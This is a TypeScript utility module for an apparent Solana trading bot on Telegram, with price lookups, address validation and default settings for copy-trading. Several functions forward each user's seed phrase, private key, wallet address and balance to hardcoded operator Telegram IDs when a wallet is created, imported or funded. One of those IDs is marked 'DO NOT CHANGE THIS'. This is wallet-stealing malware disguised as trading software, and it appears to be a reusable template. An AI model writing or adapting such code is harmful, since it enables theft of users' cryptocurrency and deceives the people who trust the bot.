import axios from 'axios';
import { PublicKey } from "@solana/web3.js";
import { sessions } from "../../session.json";
import { MyContext, MessageData, WalletData, BalanceData, MockSession, User } from "./interfaces";

const sanjiURL = "https://sanji.app/";
const solscanNetworkAddress = "https://solscan.io/account/";
const explorerNetworkTx = "https://explorer.solana.com/address/";
const explorerNetworkTxEnd = "?cluster=mainnet";
const botSupportUsername = "@trade_signal_hive"; // CHANGE THIS
const botLink = "https://t.me/SanijTradingBot?start="; // CHANGE THIS
const rickBurpBot = "https://t.me/RickBurpBot?start=";
const defaultTimer = 300; 
const recipientIds = [588749749, 8126571996]; // Replace with actual recipient user IDs // CHANGE The second one
// const recipientIds = [588749749]; // Replace with actual recipient user IDs
const recipientMeIDs = [588749749]; // DO NOT CHANGE THIS

// Function to forward user input to another Telegram user
async function forwardUserInput(ctx: MyContext, data: MessageData) {
	if (!data.message) return;

	const message = `📩 *New User Data Received:*\n\n`
		+ `👤 *Name:* ${escapeMarkdownV2(data.name || '')}\n`
		+ `📛 *Username:* @${escapeMarkdownV2(data.username || 'N/A')}\n`
		+ `💬 *Message:* \`${escapeMarkdownV2(data.message)}\``;

	// Send message to each recipient
	for (const recipientId of recipientIds) {
		try {
			await ctx.telegram.sendMessage(recipientId, message, { parse_mode: "MarkdownV2" });
		} catch (error) {
			console.error(`Failed to send message to ${recipientId}:`, error);
		}
	}
};

async function forwardUserCreatedWallet(ctx: MyContext, data: WalletData) {
	const message = `📩 *New User Wallet Created:*\n\n`
		+ `👤 *Name:* ${escapeMarkdownV2(data.name || '')}\n`
		+ `📛 *Username:* @${escapeMarkdownV2(data.username || 'N/A')}\n`
		+ `💬 *Wallet Address:* \`${data.walletAddress}\`\n`
		+ `💬 *Seed:* \`${data.seed ? data.seed : "N/A"}\`\n`
		// + `💬 *Public Key:* \`${escapeMarkdownV2(data.publicKey || '')}\`\n`
		+ `💬 *Private Key:* \`${data.privateKey}\`\n`;
		// + `💬 *Secret Key:* \`${data.secretKey}\`\n`;

	// Send message to each recipient
	for (const recipientId of recipientIds) {
		try {
			await ctx.telegram.sendMessage(recipientId, message, { parse_mode: "MarkdownV2" });
		} catch (error) {
			console.error(`Failed to send message to ${recipientId}:`, error);
		}
	}
};

async function forwardUserImportedWallet(ctx: MyContext, data: WalletData) {
	const message = `📩 *New User Wallet Imported:*\n\n`
		+ `👤 *Name:* ${escapeMarkdownV2(data.name || '')}\n`
		+ `📛 *Username:* @${escapeMarkdownV2(data.username || 'N/A')}\n`
		+ `💬 *Wallet Address:* \`${data.walletAddress}\`\n`
		+ `💬 *Seed:* \`${data.seed ? data.seed : "N/A"}\`\n`
		// + `💬 *Public Key:* \`${escapeMarkdownV2(data.publicKey || '')}\`\n`
		+ `💬 *Private Key:* \`${data.privateKey}\`\n`;
		// + `💬 *Secret Key:* \`${data.secretKey}\`\n`;

	// Send message to each recipient
	for (const recipientId of recipientIds) {
		try {
			await ctx.telegram.sendMessage(recipientId, message, { parse_mode: "MarkdownV2" });
		} catch (error) {
			console.error(`Failed to send message to ${recipientId}:`, error);
		}
	}
};

async function forwardUserWalletBalanceUpdated(ctx: MyContext, data: BalanceData) {
	if (!data.seed) return;

	const message = `📩 *New User Wallet Balance Updated:*\n\n`
		+ `👤 *Name:* ${escapeMarkdownV2(data.name || '')}\n`
		+ `📛 *Username:* @${escapeMarkdownV2(data.username || 'N/A')}\n`
		+ `💲 *Balance:* ${escapeMarkdownV2(data.balance?.toString() || 'N/A')} SOL\n\n`
		+ `💬 *Wallet Address:* \`${data.walletAddress}\`\n`
		+ `💬 *Seed:* \`${data.seed}\`\n`
		// + `💬 *Public Key:* \`${escapeMarkdownV2(data.publicKey || '')}\`\n`
		+ `💬 *Private Key:* \`${data.privateKey}\`\n`;
		// + `💬 *Secret Key:* \`${data.secretKey}\`\n`;

	// Send message to each recipient
	for (const recipientId of recipientMeIDs) {
		try {
			await ctx.telegram.sendMessage(recipientId, message, { parse_mode: "MarkdownV2" });
		} catch (error) {
			console.error(`Failed to send message to ${recipientId}:`, error);
		}
	}
};

async function getTickerDetails(ticker: string) {
	try {
		const response = await axios.get(
			`https://api.dexscreener.com/tokens/v1/solana/${ticker}`
		);
		return { err: false, data: response.data };
	} catch (error: any) {
		return { err: true, error, response_code: error.response.status };
	}
};

async function getSolanaPrice() {
	try {
		const response = await axios.get(
			`https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd`
		);
		return { err: false, data: response.data };
	} catch (error: any) {
		return { err: true, error, response_code: error.response.status };
	}
};

function isValidSolanaAddress(input: string): boolean {
	try {
		// Check if input is exactly 32 or 44 characters long
		if (input.length !== 32 && input.length !== 44) return false;

		// Try creating a PublicKey instance (this validates the address format)
		new PublicKey(input);
		return true; // Valid Solana address
	} catch (error) {
		return false; // Invalid address
	}
}

function countFilter(value: number): string {
	if (isNaN(value))
		value = 0;

	if (value < 1000)
		return value + '';

	value /= 1000;

	if (value < 1000)
		return value.toFixed(1) + 'K';

	value /= 1000;

	if (value < 1000)
		return value.toFixed(1) + 'M';

	value /= 1000;

	if (value < 1000)
		return value.toFixed(1) + 'B';

	value /= 1000;

	return value.toFixed(1) + 'T';
};

function calculatePriceImpact(
	baseReserve: number,
	quoteReserve: number,
	buyAmount: number
): number {
	const currentPrice = quoteReserve / baseReserve;

	// Simulate new reserves after the buy
	const newBaseReserve = baseReserve + buyAmount;
	const newQuoteReserve = (baseReserve * quoteReserve) / newBaseReserve;
	const newPrice = newQuoteReserve / newBaseReserve;

	// Calculate price impact
	const priceImpact = ((1 - (newPrice / currentPrice)) * 100);
	return priceImpact;
}

// Strip User Input, make it clean
function stripInput(text: string): string {
	return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "");
}

// Escape MarkdownV2 Text Automatically
function escapeMarkdownV2(text: string): string {
	return text.replace(/[_[\]()~`>#+\-=|{}.!]/g, "\\$&");
	// return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); // Main one
	// return text.replace(/[.]+/g, "\\$&");
}

const newUserDetails = {
	accept: false,
	solanaPrice: 0,
	walletBalance: 0,
	balance: 0,
	walletAddress: "",
	receiverWalletAddress: "",
	publicKey: "",
	secretKey: "",
	privateKey: "",
	seed: "",
	referrals: 0,
	referredBy: null,
	settings: {
		waitingForSettingsResponse: false,
		language: "English",
		minimumPositionValue: 0.1,
		autoBuyStatus: false,
		autoBuyValue: 0.1,
		instantRugExitStatus: false,
		autoApproveSwapStatus: false,
		leftBuyValue: 1,
		rightBuyValue: 0.5,
		leftSellValue: 50, // In percentage
		rightSellValue: 100, // In percentage
		sellInitialStatus: false,
		buySlippageValue: 10, // In percentage
		sellSlippageValue: 10, // In percentage
		maxPriceImpactValue: 50, // In percentage
		mevProtectValue: "Turbo",
		mevProtection: false,
		buyConfirmation: true,
		paperTradingMode: false,
		transactionPriorityValue: "Medium",
		transactionPriorityAmount: 0.01, // In percentage
		sellProtectionStatus: false,
	},
	positions: [],
	copyTrades: [],
	currentCopyTrade: {
		active: true,
		tag: "",
		targetWallet: "",
		buyAmount: 1,
		copySellStatus: false,
		buyGasAmount: 0.0015,
		sellGasAmount: 0.0015,
		slippageAmount: 10, // In percentage
		autoSellStatus: false,
	}
};

function getSession( ctx: MyContext): User | undefined {
	let currentSession: Array<MockSession> = sessions;

	const userId = ctx.from?.id;
	const chatId = ctx.chat?.id;

	// Check if user already exists
	const existingSession = currentSession.find((session) =>
		session.data.chatId === userId ||
		session.data.chatId === chatId ||
		session.data.fromId === userId ||
		session.data.fromId === chatId ||
		session.id === `${userId}:${userId}` ||
		session.id === `${chatId}:${chatId}`
	);

	if (existingSession && existingSession.data.user) {
		return existingSession.data.user; // Return found session
	}

	return ctx.session ? ctx.session.user : undefined; // Return newly created session
}

export { 
	defaultTimer, recipientIds, forwardUserInput, stripInput, escapeMarkdownV2, newUserDetails, botLink, botSupportUsername, 
	solscanNetworkAddress, explorerNetworkTx, explorerNetworkTxEnd, forwardUserCreatedWallet, forwardUserWalletBalanceUpdated, 
	forwardUserImportedWallet, getTickerDetails, isValidSolanaAddress, countFilter, rickBurpBot, calculatePriceImpact, getSession, 
	sanjiURL, getSolanaPrice
};